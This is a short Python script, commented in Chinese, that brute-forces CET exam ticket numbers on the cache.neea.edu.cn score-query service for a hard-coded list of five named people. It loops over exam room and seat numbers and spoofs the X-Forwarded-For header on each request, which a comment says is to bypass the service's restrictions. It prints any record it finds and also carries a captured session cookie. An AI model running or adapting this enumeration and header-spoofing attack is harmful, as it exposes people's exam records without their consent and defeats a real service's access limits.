import urllib.request
from urllib.parse import quote,unquote

'''准考证号格式
    [0:6]   学校代码
    [6:8]   年份
    [8:9]   考季 1：上半年，2：下半年
    [9:10]  四六级 1：四级，2：六级
    [10:13] 考场号
    [13:15] 座位号
'''
#姓名
name = ["王富焘","陈佳欣","李冬梅","温元周","李才燃"]
#url
url = "http://cache.neea.edu.cn/cet/query?data=CET4_191_DANGCI%2C"
#header
header={
    "User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36",
    "Cookie":"UM_distinctid=16cb1b2c86c9d-0defd862408978-7373e61-1fa400-16cb1b2c86d335; Hm_lvt_dc1d69ab90346d48ee02f18510292577=1566349380,1566349439; language=1; Hm_lpvt_dc1d69ab90346d48ee02f18510292577=1566352216",
    "Referer":"http://cet.neea.edu.cn/cet/query.html",
    "Accept-Language":"zh-CN,zh;q=0.9",
    "X-Forwarded-For":"47.48.49.50"
}
#设置几个开关
flag1,flag2,flag3 = False,False,False
#程序开始
#读取姓名
for n in name:
    urlencodeName = quote(n,'utf-8')
    #遍历考场号
    for i in range(1,400):
        if flag2 == True:
            flag3 = True
            break
        stri = str(i)
        if len(stri) < 3:
            stri = "0"*(3-len(stri))+stri
        #遍历座位号
        for j in range(1,35):
            if flag1 == True:
                flag2 = True
                break
            strj = str(j)
            if len(strj)<3:
                strj = "0"*(2-len(strj)) + strj
            #修改XFF绕过服务限制
            header['X-Forwarded-For'] = "47.48."+str(i)+"."+str(j)
            #构造学号，自行构造前半部分，5300421911
            stuNum = "5300421911"+stri+strj
            #构造url
            getUrl = url+stuNum+"%2C"+urlencodeName
            #发起请求
            response = urllib.request.Request(url = getUrl,headers=header)
            response_obj = urllib.request.urlopen(response)
            html = response_obj.read().decode('utf-8')
            #读取结果
            if "error" not in html:
                flag1 = True
                print(html)
    if flag3 == True:
        flag1,flag2,flag3 = False,False,False
        continue
